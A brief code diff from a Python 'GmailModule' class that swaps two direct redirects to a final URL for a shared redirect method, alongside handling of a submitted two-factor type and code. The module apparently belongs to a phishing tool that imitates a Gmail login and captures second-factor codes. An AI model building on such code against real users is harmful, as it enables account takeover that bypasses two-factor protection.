@@ -54,10 +54,10 @@ class GmailModule(BaseModule):
         redirect_user = triggered.get('action', None)
 
         if redirect_user == 'redirect':
-            return redirect(self.final_url, code=302)
+            return self.redirect()
 
         if not self.enable_2fa:
-            return redirect(self.final_url, code=302)
+            return self.redirect()
 
         twofactor_type = triggered.get('type', 'error')
         twofactor_code = triggered.get('code', None)
